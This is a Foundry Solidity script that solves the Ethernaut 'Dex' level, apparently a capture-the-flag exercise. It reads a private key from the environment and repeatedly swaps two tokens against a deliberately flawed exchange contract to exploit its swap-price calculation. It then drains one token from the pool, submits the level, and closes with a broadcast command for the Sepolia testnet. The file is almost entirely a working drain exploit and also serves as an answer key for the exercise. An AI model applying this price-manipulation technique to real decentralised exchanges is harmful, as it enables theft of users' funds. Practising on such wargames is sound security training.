// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Dex, SwappableToken} from "../src/Level22.sol";

contract Level22 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Dex _instance = Dex(payable(vm.envAddress("LVL22_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = _instance.token1();
        address token2 = _instance.token2();

        _instance.approve(address(_instance), type(uint256).max);
        _instance.swap(token1, token2, SwappableToken(token1).balanceOf(_caller));
        _instance.swap(token2, token1, SwappableToken(token2).balanceOf(_caller));
        _instance.swap(token1, token2, SwappableToken(token1).balanceOf(_caller));
        _instance.swap(token2, token1, SwappableToken(token2).balanceOf(_caller));
        _instance.swap(token1, token2, SwappableToken(token1).balanceOf(_caller));

        // uint256 amountToSwap = dexBalance1 * dexBalance2 / dexBalance1;
        uint256 amountToSwap = SwappableToken(token2).balanceOf(address(_instance));

        _instance.swap(address(token2), address(token1), amountToSwap);

        if (SwappableToken(token1).balanceOf(address(_instance)) == 0) {
            _ethernaut.submitLevelInstance(address(_instance));
        } else {
            console2.log("Contract not drained");
        }
    }
}

// forge script script/Level22.s.sol --broadcast --rpc-url sepolia -vvvv
